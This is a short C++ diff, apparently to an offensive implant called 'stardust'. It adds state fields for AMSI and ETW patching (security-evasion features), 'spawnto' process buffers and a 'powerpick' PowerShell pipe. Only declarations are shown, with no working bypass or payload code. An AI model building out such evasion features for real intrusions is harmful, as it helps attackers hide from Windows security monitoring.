@@ -519,13 +519,36 @@ namespace stardust
 #if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
             SPOOF_STATE spoof = {};
 #endif
+
+#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
+            bool amsi_patched = false;
+            void* amsi_veh    = nullptr;
+#endif
+#ifdef INCLUDE_EVASION_ETW
+            bool etw_patched  = false;
+#endif
         } evasion = {};
+
+        struct {
+            char     x64[260];
+            char     x86[260];
+            char     x64_args[260];
+            char     x86_args[260];
+        } spawnto = {};
 
         struct {
             char*    output_data;
             uint32_t output_length;
             uint32_t output_capacity;
         } coff = {};
+
+#ifdef INCLUDE_CMD_POWERPICK
+        struct {
+            HANDLE pipe_read;
+            HANDLE pipe_write;
+            bool   stdout_redirected;
+        } powerpick = {};
+#endif
 
         explicit instance();
 
